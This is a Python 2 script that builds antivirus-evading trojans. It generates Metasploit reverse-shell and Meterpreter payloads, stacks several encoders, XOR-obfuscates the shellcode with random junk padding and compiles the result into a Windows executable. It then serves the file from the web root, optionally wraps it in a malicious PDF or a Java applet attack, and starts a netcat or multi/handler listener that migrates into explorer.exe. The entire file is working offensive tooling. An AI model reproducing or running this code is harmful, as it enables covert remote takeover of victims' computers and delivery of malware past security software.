#!/usr/bin/python
#coding: utf-8
from struct import *
import os
import commands
import subprocess
import random 
import socket
os.system("clear")
os.chdir("/usr/bin/")

# Get External IP
os.system("curl ifconfig.me >> ip.txt")
myFile = open('ip.txt','r')
ehost = myFile.read()
os.remove("ip.txt")
os.system("clear")
print "[i] External IP: ", ehost

# Get Internal IP
i = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); i.connect(('8.8.8.8', 80))
ihost = i.getsockname()[0]
print "[>] Internal IP: ", ihost

host = raw_input("lhost (e external i internal ip default i) ?").strip()
if host == 'e':
	lhost = ehost
	print "[>] lhost: ", lhost
elif host == 'i':
	lhost = ihost
	print "[>] lhost: ", lhost
if host == '':
	lhost = ihost
	print "[>] lhost: ", lhost
else:
	lhost = host
	print "[>] lhost: ", lhost

print "**************************************"
print "1) windows/shell_reverse_tcp (netcat)"
print "2) windows/shell/reverse_tcp"
print "3) windows/shell/reverse_http"
print "4) windows/shell/reverse_https"
print "5) windows/meterpreter/reverse_tcp"
print "6) windows/meterpreter/reverse_http"
print "7) windows/meterpreter/reverse_https"
print "**************************************"
payload = raw_input("Select a payload (1-8 default 5):").strip()

lport = raw_input("lport ? default / tcp = 4445 / http = 8080 / https = 443").strip()

payload_raw = "temp.raw"
out = "temp.c"
structure = "/root/Desktop/tools/avbypass/structure.c"
key = random.randint(0,255)
print "[*] Generating random junk..."
print "[*] Randomizing file size..."
randomSize = random.randint(20480,25600)

junkA = ""
junkB = "" 

junkA += "\""
for i in xrange(1,randomSize):
	junkA += chr(random.randint(65,90)) 
junkA +=  "\""

junkB += "\""
for i in xrange(0,randomSize):
	junkB += chr(random.randint(65,90)) 
junkB +=  "\""



print "[*] Generating metasploit shellcode..."
if payload == "1":
	if lport == '':
		lport = '4445'
	os.system("./msfpayload windows/shell_reverse_tcp LHOST=%s LPORT=%s ExitOnSession='false' SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "2":
	if lport == '':
		lport = '4445'
	os.system("./msfpayload windows/shell/reverse_tcp LHOST=%s LPORT=%s ExitOnSession='false' SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "3":
	if lport == '':
		lport = '8080'
	os.system("./msfpayload windows/shell/reverse_http LHOST=%s LPORT=%s ExitOnSession='false' SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "4":
	if lport == '':
		lport = '443'
	os.system("./msfpayload windows/shell/reverse_https LHOST=%s LPORT=%s ExitOnSession='false' SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "5":
	if lport == '':
		lport = '4445'
	os.system("./msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s ExitOnSession='false'SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "6":
	if lport == '':
		lport = '8080'
	os.system("./msfpayload windows/meterpreter/reverse_http LHOST=%s LPORT=%s ExitOnSession='false' SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "7":
	if lport == '':
		lport = '443'
	os.system("./msfpayload windows/meterpreter/reverse_https LHOST=%s LPORT=%s ExitOnSession='false'SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "":
	if lport == '':
		lport = '4445'
	os.system("./msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s ExitOnSession='false' SessionCommunicationTimeout='0' R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))
	payload = '5'


a = open(payload_raw,"rb")
b = open(out,"w")

payload_raw = a.read()
tempArray = []
outArray = []
x = 0

print "[*] Encoding with XOR key: ", hex(key) 
print "[*] Obfuscating shellcode..."
length = int(len(payload_raw)*2)

for i in xrange(0,length):
	if i % 2 == 0:
		tempArray.append(unpack("B",payload_raw[x])[0]^key)
		x += 1
	else:
		randomByte = random.randint(65,90)
		tempArray.append(randomByte)	
for i in range(0,len(tempArray)):
	tempArray[i]="\\x%x"%tempArray[i]
for i in range(0,len(tempArray),15):
	outArray.append('\n"'+"".join(tempArray[i:i+15])+"\"")
outArray = "".join(outArray)

devide = "i % 2;"
  
open_structure = open(structure).read()
code = open_structure % (junkA,outArray,junkB,key,length,devide)
b.write(code)
b.flush()

print "[*] Compiling trojan horse..."
os.system("i586-mingw32msvc-gcc -mwindows temp.c")
print "[*] Stripping out the debugging symbols..."
os.system("strip --strip-debug a.exe")
print "[*] Moving trojan horse to web root..."
os.system("mv a.exe /var/www/test.exe")
print "**************************************"
print "1) apache server"
print "2) java applet attack"
print "3) create evil PDF"
print "**************************************"
attack = raw_input("Select an attack (1-3 Default 1):").strip()
if attack == "1":
	print "[*] Starting apache..."
	os.system('sh -c "service apache2 start; sleep 4"')
elif attack == "2":
	subprocess.Popen(args=["gnome-terminal", "--command=sh javaAttack.sh"]).pid
elif attack == "3":
	original = raw_input("path to original pdf: ").strip()
	print "[*] Creating evil PDF..."
	os.system("./msfcli windows/fileformat/adobe_pdf_embedded_exe EXE::Custom=/var/www/test.exe FILENAME=test.pdf INFILENAME=%s E" % (original))
	os.system("mv /root/.msf4/local/test.pdf /var/www")
	print "[*] moving test.pdf to webroot"
elif attack == "":
	print "[*] Starting apache..."
	os.system('sh -c "service apache2 start; sleep 4"')
print "[*] lhost: ", lhost
print "[*] lport: ", lport

myFile = open('handler.rc', 'wb')
if payload == "1":
	print "[*] Starting the netcat listener..."
	os.system("nc -lvp %s" % (lport))
	print "[*] Cleaning up..."
	os.remove("temp.c")
	os.remove("temp.raw")
	print "[*] Done !"
	exit(0)
elif payload == "2":
	myFile.write("use exploit/multi/handler\nset PAYLOAD windows/shell/reverse_tcp\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset AutoRunScript 'migrate -n explorer.exe -k'\nexploit -j"  % (lhost, lport))
elif payload == "3":
	myFile.write("use exploit/multi/handler\nset PAYLOAD windows/shell/reverse_http\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset AutoRunScript 'migrate -n explorer.exe -k'\nexploit -j"  % (lhost, lport))
elif payload == "4":
	myFile.write("use exploit/multi/handler\nset PAYLOAD windows/shell/reverse_https\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset AutoRunScript 'migrate -n explorer.exe -k'\nexploit -j"  % (lhost, lport))
elif payload == "5":
	myFile.write("use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset AutoRunScript 'migrate -n explorer.exe -k'\nexploit -j"  % (lhost, lport))
elif payload == "6":
	myFile.write("use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_http\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset AutoRunScript 'migrate -n explorer.exe -k'\nexploit -j"  % (lhost, lport))
elif payload == "7":
	myFile.write("use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset AutoRunScript 'migrate -n explorer.exe -k'\nexploit -j" % (lhost, lport))

myFile.close()
print "[*] Starting the multi handler..."
os.system("msfconsole -r handler.rc")
print "[*] Cleaning up..."
os.remove("temp.c")
os.remove("temp.raw")
print "[*] Done !"





